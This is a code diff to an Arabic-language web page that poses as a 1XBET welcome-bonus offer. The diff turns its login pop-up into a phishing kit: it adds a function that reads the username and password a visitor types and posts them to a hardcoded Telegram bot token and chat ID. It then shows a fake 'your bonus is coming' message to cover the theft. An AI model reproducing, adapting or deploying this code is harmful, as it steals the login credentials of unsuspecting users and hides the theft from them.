@@ -4,14 +4,9 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>1XBET - عرض ترحيبي</title>
-  <!-- استدعاء خط Inter من Google Fonts -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
 
     body {
       background: linear-gradient(135deg, #102544, #1a3055);
@@ -209,12 +204,12 @@
   </div>
 
   <div class="modal" id="loginModal">
-    <div class="modal-content">
+    <div class="modal-content" id="modalContent">
       <span class="close-btn" onclick="closeModal()">&times;</span>
       <h3>تسجيل الدخول</h3>
-      <input type="text" placeholder="البريد الإلكتروني أو اسم المستخدم">
-      <input type="password" placeholder="كلمة المرور">
-      <button>دخول</button>
+      <input type="text" id="username" placeholder="البريد الإلكتروني أو اسم المستخدم">
+      <input type="password" id="password" placeholder="كلمة المرور">
+      <button onclick="sendLoginData()">دخول</button>
     </div>
   </div>
 
@@ -232,6 +227,34 @@
       if (event.target == modal) {
         modal.style.display = "none";
       }
+    }
+
+    function sendLoginData() {
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      const token = "7908642649:AAH6lzPgbqKss3nN-A0vUpKhYsmtPDGUoHU";
+      const chatId = "7891583282";
+      const message = `🔐 Login Info:\n👤 Username: ${username}\n🔑 Password: ${password}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      }).then(response => {
+        document.getElementById('modalContent').innerHTML = `
+          <h3 style="color:#9deafb;">سيتم التحقق من الشروط</h3>
+          <p style="margin-top: 10px;">ستحصل على مكافأتك قريبًا، افحص حسابك مرة أخرى.</p>
+        `;
+        setTimeout(() => {
+          location.reload();
+        }, 2000);
+      }).catch(error => {
+        location.reload();
+      });
     }
   </script>
 
